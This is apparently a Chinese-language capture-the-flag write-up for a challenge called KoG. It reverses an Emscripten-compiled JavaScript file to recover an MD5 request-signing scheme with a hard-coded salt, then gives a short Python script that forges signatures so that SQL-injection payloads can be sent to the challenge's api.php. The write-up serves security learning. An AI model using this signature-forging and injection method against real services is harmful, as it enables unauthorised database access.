## KoG

发现`Module.main`会对参数为纯数字的时候进行签名后，传给api.php，但有其他字符时不予签名。
仔细观察`functionn.js`，可以发现经过c++符号修饰的函数名，可以扔到`c++filt`里查看：
```
~$ c++filt _ZN5HASH16updateEPKhj
HASH1::update(unsigned char const*, unsigned int)
```
可知有个HASH1的类，仔细寻找代码里隐藏的常数可以知道是md5。


```javascript
function __ZN5HASH16updateEPKhj($this,$input,$length) {
 $this = $this|0;
 $input = $input|0;
 $length = $length|0;
```
然后在上面的`__ZN5HASH16updateEPKhj`update函数入口下断点，每次停下的时候在console里把`HEAP`里的`$input`指针指向的位置打出来看看，就知道传入了哪些字符串。一开始程序会传入"Start_here_"作为提示，但后来发现这个字符串是不需要的。事实上，把其他传进来的字符串拼接后，发现`functionn.js`做的就是return md5("d727d11f6d284a0d%s This_is_salt%s" % (payload, timestamp))，然后我们就可以自己对payload签名了，在payload中进行sql注入即可。


脚本如下：
```py
# __ZN5HASH16updateEPKhj
payload = sys.argv[1]
print payload
hash = hashlib.md5("d727d11f6d284a0d%s This_is_salt1489820887"%payload).hexdigest()
print requests.get('http://202.120.7.213:11181/api.php', params={'id':payload, 'hash':hash, 'time':'1489820887'}).text
```
